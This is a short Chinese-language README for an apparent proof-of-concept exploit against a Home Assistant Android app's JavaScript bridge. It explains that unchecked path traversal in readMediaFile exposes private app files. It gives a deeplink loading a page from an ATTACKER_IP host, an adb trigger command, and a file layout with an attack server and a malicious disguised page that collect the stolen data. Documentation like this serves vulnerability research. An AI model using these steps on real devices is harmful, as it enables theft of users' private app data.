# EXP: 1.2 Insecure JavaScript Bridge Implementation

## 漏洞概述

HomeAppBridge 的 `readMediaFile(fileName)` 方法直接使用 `File(baseDir, fileName)` 拼接路径，未对 `fileName` 做任何路径校验。攻击者通过路径穿梭（`../`）可读取 `snapshots` 目录以外的 App 私有文件。

## 触发方式

```
homeassistant://webview?url=http://<ATTACKER_IP>:8000/exp/1.2
```

## 启动服务

```bash
cd exp/home-assistant/1.2_Insecure_JavaScript_Bridge_Implementation
python server.py
```

## 文件结构

```
1.2_Insecure_JavaScript_Bridge_Implementation/
├── server.py          # 攻击服务器（HTTP :8000）
├── exp/
│   └── 1.2.html       # 恶意页面（伪装为"安防回放"）
├── received/          # 回收的数据（自动生成）
└── readme.md          # 本文件
```

## 验证步骤

1. 启动服务器: `python server.py`
2. 在模拟器中通过 adb 触发 Deeplink:
   ```
   adb shell am start -a android.intent.action.VIEW -d "homeassistant://webview?url=http://<本机IP>:8000/exp/1.2"
   ```
3. 观察 `received/` 目录下生成的回收数据文件
4. 检查是否成功读取到 App 私有文件内容（如 `shared_prefs/xxx.xml`）

## 预期结果

正常读取 `snapshots/driveway_20260529_080000.jpg` 的同时，也能通过路径穿梭读取到 App 其他目录下的私有文件。
